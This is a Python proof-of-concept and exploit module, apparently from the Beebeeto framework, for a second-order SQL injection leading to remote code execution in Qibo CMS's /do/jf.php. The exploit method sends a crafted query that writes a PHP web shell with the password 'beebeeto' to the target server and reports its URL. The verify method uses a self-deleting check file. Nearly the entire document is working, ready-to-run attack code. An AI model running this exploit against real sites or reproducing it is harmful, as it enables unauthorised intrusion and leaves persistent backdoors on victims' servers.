#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import random
import string
import hashlib
import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0121',
            'name': '齐博分类系统 /do/jf.php 远程代码执行漏洞 POC & Exploit',
            'author': 'friday',
            'create_date': '2015-07-10',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Qibo',
            'vul_version': ['<2015.06.30'],
            'type': 'Code Execution',
            'tag': ['奇博远程代码执行漏洞', '二次SQL注入', 'Command Execution', 'php'],
            'desc': '''
                    Qibo CMS 存在二次SQL注入导致的命令执行，可GetShell。
                    ''',
            'references': [
                            'http://security.alibaba.com/blog/blog.htm?spm=0.0.0.0.MRoUcG&id=21',
                           ],
        },
    }

    @classmethod
    def exploit(cls, args):
        target = args['options']['target']
        first_url = target + "/search.php"
        secend_url = target + "/do/jf.php"

        rand_num = random.uniform(10000,99999)
        hash_num = hashlib.md5(str(rand_num)).hexdigest()
        shell_url = target + '/do/%d.php' % rand_num

        payload = ("action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack="
                   "jfadmin&action=addjf&list=1&fid=1&Apower[jfadmin_mod]=1&title=%s&"
                   "content=${@fwrite(fopen('%d.php', 'w+'), '<?php var_dump(md5(123));"
                   "@assert($_REQUEST[beebeeto]);?>')}") % (hash_num,rand_num)

        if args['options']['verbose']:
            print '[*] Request URL: ' + first_url

        if args['options']['verbose']:
            print '[*] Send Payload: ' + payload

        requests.get(first_url + '?' + payload)
        if hash_num in requests.get(secend_url).content:
            if args['options']['verbose']:
                print '[*] Checking'

        if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).content:
            args['success'] = True
            args['poc_ret']['webshell'] = shell_url
            args['poc_ret']['password'] = 'beebeeto'

        return args


    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        first_url = target + "/search.php"
        secend_url = target + "/do/jf.php"

        rand_num = random.uniform(10000,99999)
        hash_num = hashlib.md5(str(rand_num)).hexdigest()
        shell_url = target + '/do/%d.php' % rand_num

        payload = ("action=search&keyword=asd&postdb[city_id]=../../admin/hack&hack="
                   "jfadmin&action=addjf&list=1&fid=1&Apower[jfadmin_mod]=1&title=%s&"
                   "content=${@fwrite(fopen('%d.php', 'w+'), '<?php var_dump(md5(123));"
                   "unlink(__FILE__);?>')}") % (hash_num,rand_num)

        if args['options']['verbose']:
            print '[*] Request URL: ' + first_url

        if args['options']['verbose']:
            print '[*] Send Payload: ' + payload

        requests.get(first_url + '?' + payload)
        if hash_num in requests.get(secend_url).content:
            if args['options']['verbose']:
                print '[*] Checking'

        if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).content:
            args['success'] = True
            args['poc_ret']['vul_url'] = shell_url

        return args

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())